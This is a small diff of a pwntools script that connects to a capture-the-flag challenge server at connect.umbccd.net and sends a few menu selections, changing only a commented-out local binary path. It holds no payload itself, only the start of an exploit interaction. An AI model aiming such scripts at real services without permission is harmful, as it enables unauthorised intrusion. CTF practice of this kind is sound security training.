@@ -1,6 +1,6 @@
 from pwn import *
 p=remote("connect.umbccd.net",22237)
-#p=process("./2chall")
+#p=process("./chall")
 p.sendlineafter(b'> ',b'2')
 p.sendlineafter(b'> ',b'1')
 p.sendlineafter(b'> ',b'4')
